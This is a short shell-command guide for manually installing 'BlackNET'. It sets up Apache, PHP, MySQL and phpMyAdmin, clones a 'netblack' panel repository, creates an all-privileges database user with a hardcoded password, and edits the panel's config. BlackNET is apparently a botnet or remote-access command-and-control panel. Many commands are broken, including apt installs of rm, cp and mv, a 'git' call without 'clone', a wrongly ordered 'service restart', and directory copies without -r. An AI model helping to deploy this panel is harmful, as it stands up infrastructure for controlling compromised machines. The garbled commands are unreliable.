# blacknetmanualsetup
su
password your;
apt-get update
cd ~
apt install python
apt install rm
apt install sudo
apt install cp
apt install zip
apt install unzip
apt install mv
apt install wget
apt install screen
apt install git
apt install nano
apt install apache2
add-apt-repository ppa:ondrej/php
apt-get update
deb http://ppa.launchpad.net/ondrej/php/ubuntu bionic main
deb-src http://ppa.launchpad.net/ondrej/php/ubuntu bionic main
apt-get install php7.3
apt-get install -y mysql-server
service mysql start
apt install php7.3-cli php7.3-fpm php7.3-json php7.3-pdo php7.3-mysql php7.3-zip php7.3-gd  php7.3-mbstring php7.3-curl php7.3-xml php7.3-bcmath php7.3-json
service restart apache2
git https://github.com/h4ckti2/php73myadmin
mv php73myadmin phpmyadmin
cd /var/www/html
rm *.*
cd ~
cp phpmyadmin /var/www/html
cd ~
git clone https://github.com/h4ckti2/netblack
mv netblack site
cp site /var/www/html
cd ~
mysql -u root -p
Password; root
CREATE USER 'blackadmin'@'127.0.0.1' IDENTIFIED BY '@#DSDW@#E##@';
create database blackdb;
GRANT ALL PRIVILEGES ON * . * TO 'blackadmin'@'127.0.0.1';
FLUSH PRIVILEGES;
ALTER USER 'root'@'localhost' IDENTIFIED BY '@#DSDW@#E##@';
FLUSH PRIVILEGES;
nano /var/www/html/site/config/config.php
define("DB_HOST", "localhost"); > define("DB_HOST", "127.0.0.1");
define("DB_USER", "Database Username"); > define("DB_USER", "blackadmin");
define("DB_PASS", "Database Password"); > define("DB_PASS", "@#DSDW@#E##@");
define("DB_NAME", "Database Name"); > define("DB_NAME", "blackdb");

define("ADMIN_EMAIL", "localhost@gmail.com"); > define("ADMIN_EMAIL", "your gmail@gmail.com"); // gmail.com
define("SITE_URL", "Panel URL"); > define("SITE_URL", "http://your host.com/site"); 
ctrl + O
ctrl + x
service restart apache2

_____________
setup blacknet
http://your host.com/site/install.php
cd /var/www/html
rm update.php
rm install.php


